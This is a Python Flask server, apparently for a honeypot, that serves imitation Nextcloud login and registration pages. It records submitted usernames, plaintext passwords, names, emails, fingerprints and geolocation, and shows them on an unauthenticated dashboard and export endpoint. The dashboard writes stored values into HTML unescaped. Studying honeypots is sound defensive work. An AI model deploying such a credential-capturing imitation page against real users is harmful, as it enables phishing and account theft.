#!/usr/bin/env python3
"""
Nextcloud Honeypot Server
A Flask-based server to serve the fake Nextcloud login pages and log all attempts.
"""

import os
import json
import sqlite3
import hashlib
from datetime import datetime, timezone
from flask import Flask, request, jsonify, send_from_directory, redirect, url_for
from werkzeug.middleware.proxy_fix import ProxyFix
import logging
from logging.handlers import RotatingFileHandler
import ipaddress
import re
import geoip2.database
import geoip2.errors

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

# Configuration
DATABASE_PATH = 'honeypot.db'
LOG_FILE = 'honeypot.log'
GEOIP_DATABASE = 'GeoLite2-City.mmdb'  # Download from MaxMind
MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
BACKUP_COUNT = 5

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create rotating file handler
if not os.path.exists('logs'):
    os.makedirs('logs')

file_handler = RotatingFileHandler(
    f'logs/{LOG_FILE}',
    maxBytes=MAX_LOG_SIZE,
    backupCount=BACKUP_COUNT
)
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
))
file_handler.setLevel(logging.INFO)
app.logger.addHandler(file_handler)

# Initialize database
def init_database():
    """Initialize SQLite database with required tables."""
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    # Create sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL
        )
    ''')

    # Create login_attempts table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            attempt_number INTEGER,
            username TEXT,
            password TEXT,
            password_hash TEXT,
            remember_me BOOLEAN,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            user_agent TEXT,
            referrer TEXT,
            mouse_movements TEXT,
            form_fill_time INTEGER,
            screen_info TEXT,
            browser_info TEXT,
            timezone TEXT,
            success BOOLEAN DEFAULT FALSE,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')

    # Create registration_attempts table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS registration_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            attempt_number INTEGER,
            fullname TEXT,
            email TEXT,
            username TEXT,
            password TEXT,
            password_hash TEXT,
            terms_accepted BOOLEAN,
            newsletter_subscribed BOOLEAN,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            user_agent TEXT,
            referrer TEXT,
            mouse_movements TEXT,
            form_fill_time INTEGER,
            screen_info TEXT,
            browser_info TEXT,
            timezone TEXT,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')

    # Create activity_log table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS activity_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            activity_type TEXT,
            data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')

    conn.commit()
    conn.close()

def get_client_ip():
    """Extract client IP address from request headers."""
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    return ip

def get_geolocation(ip_address):
    """Get geolocation information for IP address."""
    try:
        if not os.path.exists(GEOIP_DATABASE):
            return None, None, None, None

        with geoip2.database.Reader(GEOIP_DATABASE) as reader:
            try:
                response = reader.city(ip_address)
                return (
                    response.country.name,
                    response.city.name,
                    float(response.location.latitude) if response.location.latitude else None,
                    float(response.location.longitude) if response.location.longitude else None
                )
            except geoip2.errors.AddressNotFoundError:
                return None, None, None, None
    except Exception as e:
        app.logger.error(f"Geolocation error: {e}")
        return None, None, None, None

def hash_password(password):
    """Create SHA-256 hash of password for storage."""
    return hashlib.sha256(password.encode('utf-8')).hexdigest()

def log_session(session_id, ip_address, user_agent):
    """Log or update session information."""
    country, city, latitude, longitude = get_geolocation(ip_address)

    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    # Check if session exists
    cursor.execute('SELECT id FROM sessions WHERE session_id = ?', (session_id,))
    if cursor.fetchone():
        # Update existing session
        cursor.execute('''
            UPDATE sessions
            SET last_seen = CURRENT_TIMESTAMP, ip_address = ?, user_agent = ?
            WHERE session_id = ?
        ''', (ip_address, user_agent, session_id))
    else:
        # Create new session
        cursor.execute('''
            INSERT INTO sessions
            (session_id, ip_address, user_agent, country, city, latitude, longitude)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (session_id, ip_address, user_agent, country, city, latitude, longitude))

    conn.commit()
    conn.close()

@app.route('/')
def index():
    """Serve the main login page."""
    return send_from_directory('.', 'index.html')

@app.route('/register.html')
def register():
    """Serve the registration page."""
    return send_from_directory('.', 'register.html')

@app.route('/styles.css')
def styles():
    """Serve CSS file."""
    return send_from_directory('.', 'styles.css')

@app.route('/script.js')
def script():
    """Serve JavaScript file for login page."""
    return send_from_directory('.', 'script.js')

@app.route('/register.js')
def register_script():
    """Serve JavaScript file for registration page."""
    return send_from_directory('.', 'register.js')

@app.route('/api/honeypot/log', methods=['POST'])
def log_honeypot_activity():
    """Log honeypot activity from JavaScript."""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        activity_type = data.get('type')
        activity_data = data.get('data', {})
        session_id = activity_data.get('session_id', 'unknown')
        ip_address = get_client_ip()

        # Log session information
        user_agent = request.headers.get('User-Agent', '')
        log_session(session_id, ip_address, user_agent)

        # Handle different activity types
        if activity_type == 'login_attempt':
            log_login_attempt(activity_data, ip_address)
        elif activity_type == 'registration_attempt':
            log_registration_attempt(activity_data, ip_address)
        else:
            # Log general activity
            log_general_activity(session_id, activity_type, activity_data, ip_address)

        # Log to file as well
        app.logger.info(f"HONEYPOT {activity_type}: {session_id} from {ip_address}")

        return jsonify({'status': 'logged'}), 200

    except Exception as e:
        app.logger.error(f"Error logging honeypot activity: {e}")
        return jsonify({'error': 'Logging failed'}), 500

def log_login_attempt(data, ip_address):
    """Log login attempt to database."""
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    password_hash = hash_password(data.get('password', '')) if data.get('password') else None

    cursor.execute('''
        INSERT INTO login_attempts
        (session_id, attempt_number, username, password, password_hash, remember_me,
         ip_address, user_agent, referrer, mouse_movements, form_fill_time,
         screen_info, browser_info, timezone)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        data.get('session_id'),
        data.get('attempt_number'),
        data.get('username'),
        data.get('password'),  # Store plaintext for honeypot analysis
        password_hash,
        data.get('remember_me', False),
        ip_address,
        data.get('user_agent'),
        data.get('referrer'),
        json.dumps(data.get('mouse_movements', [])),
        data.get('form_fill_time'),
        json.dumps(data.get('screen_info', {})),
        json.dumps(data.get('browser_info', {})),
        data.get('timezone')
    ))

    conn.commit()
    conn.close()

def log_registration_attempt(data, ip_address):
    """Log registration attempt to database."""
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    password_hash = hash_password(data.get('password', '')) if data.get('password') else None

    cursor.execute('''
        INSERT INTO registration_attempts
        (session_id, attempt_number, fullname, email, username, password, password_hash,
         terms_accepted, newsletter_subscribed, ip_address, user_agent, referrer,
         mouse_movements, form_fill_time, screen_info, browser_info, timezone)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        data.get('session_id'),
        data.get('attempt_number'),
        data.get('fullname'),
        data.get('email'),
        data.get('username'),
        data.get('password'),  # Store plaintext for honeypot analysis
        password_hash,
        data.get('terms_accepted', False),
        data.get('newsletter_subscribed', False),
        ip_address,
        data.get('user_agent'),
        data.get('referrer'),
        json.dumps(data.get('mouse_movements', [])),
        data.get('form_fill_time'),
        json.dumps(data.get('screen_info', {})),
        json.dumps(data.get('browser_info', {})),
        data.get('timezone')
    ))

    conn.commit()
    conn.close()

def log_general_activity(session_id, activity_type, data, ip_address):
    """Log general activity to database."""
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()

    cursor.execute('''
        INSERT INTO activity_log (session_id, activity_type, data, ip_address)
        VALUES (?, ?, ?, ?)
    ''', (session_id, activity_type, json.dumps(data), ip_address))

    conn.commit()
    conn.close()

@app.route('/api/client-ip')
def client_ip():
    """Return client IP address."""
    return jsonify({'ip': get_client_ip()})

@app.route('/admin/dashboard')
def admin_dashboard():
    """Simple admin dashboard to view logs."""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()

        # Get recent login attempts
        cursor.execute('''
            SELECT username, password, ip_address, timestamp, user_agent
            FROM login_attempts
            ORDER BY timestamp DESC
            LIMIT 50
        ''')
        login_attempts = cursor.fetchall()

        # Get recent registration attempts
        cursor.execute('''
            SELECT fullname, email, username, password, ip_address, timestamp
            FROM registration_attempts
            ORDER BY timestamp DESC
            LIMIT 50
        ''')
        registration_attempts = cursor.fetchall()

        # Get session statistics
        cursor.execute('''
            SELECT COUNT(*) as total_sessions,
                   COUNT(DISTINCT ip_address) as unique_ips,
                   COUNT(DISTINCT country) as countries
            FROM sessions
        ''')
        stats = cursor.fetchone()

        conn.close()

        # Create simple HTML response
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Honeypot Dashboard</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                table {{ border-collapse: collapse; width: 100%; margin-bottom: 30px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
                .stats {{ background: #f9f9f9; padding: 15px; margin-bottom: 20px; }}
                .danger {{ background-color: #ffebee; }}
            </style>
        </head>
        <body>
            <h1>Nextcloud Honeypot Dashboard</h1>

            <div class="stats">
                <h3>Statistics</h3>
                <p>Total Sessions: {stats[0]}</p>
                <p>Unique IP Addresses: {stats[1]}</p>
                <p>Countries: {stats[2] or 0}</p>
            </div>

            <h2>Recent Login Attempts</h2>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>User Agent</th>
                </tr>
        """

        for attempt in login_attempts:
            username, password, ip, timestamp, user_agent = attempt
            html += f"""
                <tr class="danger">
                    <td>{timestamp}</td>
                    <td>{ip}</td>
                    <td><strong>{username}</strong></td>
                    <td><strong>{password}</strong></td>
                    <td>{user_agent[:100]}...</td>
                </tr>
            """

        html += """
            </table>

            <h2>Recent Registration Attempts</h2>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>Full Name</th>
                    <th>Email</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
        """

        for attempt in registration_attempts:
            fullname, email, username, password, ip, timestamp = attempt
            html += f"""
                <tr class="danger">
                    <td>{timestamp}</td>
                    <td>{ip}</td>
                    <td>{fullname}</td>
                    <td>{email}</td>
                    <td><strong>{username}</strong></td>
                    <td><strong>{password}</strong></td>
                </tr>
            """

        html += """
            </table>

            <p><small>⚠️ This is a honeypot system. All login attempts are logged for security analysis.</small></p>
        </body>
        </html>
        """

        return html

    except Exception as e:
        app.logger.error(f"Dashboard error: {e}")
        return f"Dashboard error: {e}", 500

@app.route('/api/export/json')
def export_json():
    """Export all honeypot data as JSON."""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        conn.row_factory = sqlite3.Row  # Enable dict-like access
        cursor = conn.cursor()

        data = {}

        # Export sessions
        cursor.execute('SELECT * FROM sessions')
        data['sessions'] = [dict(row) for row in cursor.fetchall()]

        # Export login attempts
        cursor.execute('SELECT * FROM login_attempts')
        data['login_attempts'] = [dict(row) for row in cursor.fetchall()]

        # Export registration attempts
        cursor.execute('SELECT * FROM registration_attempts')
        data['registration_attempts'] = [dict(row) for row in cursor.fetchall()]

        # Export activity log
        cursor.execute('SELECT * FROM activity_log')
        data['activity_log'] = [dict(row) for row in cursor.fetchall()]

        conn.close()

        return jsonify(data)

    except Exception as e:
        app.logger.error(f"Export error: {e}")
        return jsonify({'error': str(e)}), 500

# Handle all other routes to serve static files or redirect
@app.route('/<path:filename>')
def serve_static(filename):
    """Serve static files."""
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    else:
        # Redirect unknown paths to main page
        return redirect(url_for('index'))

if __name__ == '__main__':
    # Initialize database on startup
    init_database()

    print("🍯 Nextcloud Honeypot Server Starting...")
    print("📊 Dashboard: http://localhost:5000/admin/dashboard")
    print("📁 Database: honeypot.db")
    print("📜 Logs: logs/honeypot.log")
    print("🚨 All activities will be logged!")

    # Run the server
    app.run(host='0.0.0.0', port=5000, debug=False)
